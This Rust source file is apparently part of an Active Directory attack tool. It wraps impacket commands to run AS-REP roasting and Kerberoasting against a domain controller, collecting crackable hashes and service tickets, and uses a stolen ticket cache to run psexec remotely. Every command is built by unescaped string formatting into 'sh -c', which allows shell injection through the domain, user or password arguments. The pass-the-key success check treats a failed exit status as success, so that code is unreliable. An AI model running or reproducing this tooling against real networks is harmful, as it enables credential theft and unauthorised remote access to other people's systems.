use std::process::Command;
use tracing::{info, warn};

pub struct KerberosAttack;

#[derive(Debug)]
pub struct KrbResult {
    pub attack: String,
    pub target: String,
    pub success: bool,
    pub output: String,
}

impl KerberosAttack {
    /// AS-REP Roasting: find users without pre-authentication required
    pub fn asrep_roast(domain: &str, dc_ip: &str, wordlist: Option<&str>) -> KrbResult {
        let users_file = wordlist.unwrap_or("/usr/share/wordlists/kerberos_userlist.txt");

        let cmd = format!(
            "impacket-GetNPUsers -dc-ip {} -no-pass {} -usersfile {} 2>/dev/null",
            dc_ip, domain, users_file
        );

        match Command::new("sh").arg("-c").arg(&cmd).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let hashes: Vec<&str> = stdout.lines()
                    .filter(|l| l.contains("$krb5asrep$"))
                    .collect();
                let success = !hashes.is_empty();
                if success {
                    info!("AS-REP: found {} roastable users", hashes.len());
                }
                let detail_users: Vec<String> = hashes.iter().take(3).map(|h| {
                    let parts: Vec<&str> = h.splitn(2, ':').collect();
                    parts.first().unwrap_or(h).to_string()
                }).collect();
                KrbResult {
                    attack: "AS-REP Roast".into(),
                    target: format!("{}/{}", domain, dc_ip),
                    success,
                    output: format!("hashes_found={}, details={}", hashes.len(), detail_users.join(", ")),
                }
            }
            Err(e) => KrbResult {
                attack: "AS-REP Roast".into(),
                target: format!("{}/{}", domain, dc_ip),
                success: false,
                output: format!("impacket not available: {}", e),
            },
        }
    }

    /// Kerberoasting: request TGS for SPN accounts
    pub fn kerberoast(domain: &str, dc_ip: &str, username: &str, password: &str) -> KrbResult {
        let cmd = format!(
            "impacket-GetUserSPNs -dc-ip {} -request '{}'/'{}':'{}' 2>/dev/null",
            dc_ip, domain, username, password
        );

        match Command::new("sh").arg("-c").arg(&cmd).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let tickets: Vec<&str> = stdout.lines()
                    .filter(|l| l.contains("$krb5tgs$"))
                    .collect();
                let success = !tickets.is_empty();
                KrbResult {
                    attack: "Kerberoast".into(),
                    target: format!("{}/{}", domain, dc_ip),
                    success,
                    output: format!("tickets={}", tickets.len()),
                }
            }
            Err(e) => KrbResult {
                attack: "Kerberoast".into(),
                target: format!("{}/{}", domain, dc_ip),
                success: false,
                output: format!("impacket not available: {}", e),
            },
        }
    }

    /// Pass-the-Key: use existing kirbi/ccache to access services
    pub fn ptk_auth(target: &str, service: &str, ccache_path: &str) -> KrbResult {
        let cmd = format!(
            "KRB5CCNAME={} impacket-psexec -k -no-pass '{}@{}' 2>/dev/null",
            ccache_path, service, target
        );

        match Command::new("sh").arg("-c").arg(&cmd).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let success = stdout.contains("SUCCESS") || !out.status.success();
                KrbResult {
                    attack: "PTK".into(),
                    target: format!("{}@{}", service, target),
                    success,
                    output: if success { "Kerberos auth accepted".into() } else { stdout.to_string() },
                }
            }
            Err(e) => KrbResult {
                attack: "PTK".into(),
                target: format!("{}@{}", service, target),
                success: false,
                output: format!("Failed: {}", e),
            },
        }
    }
}
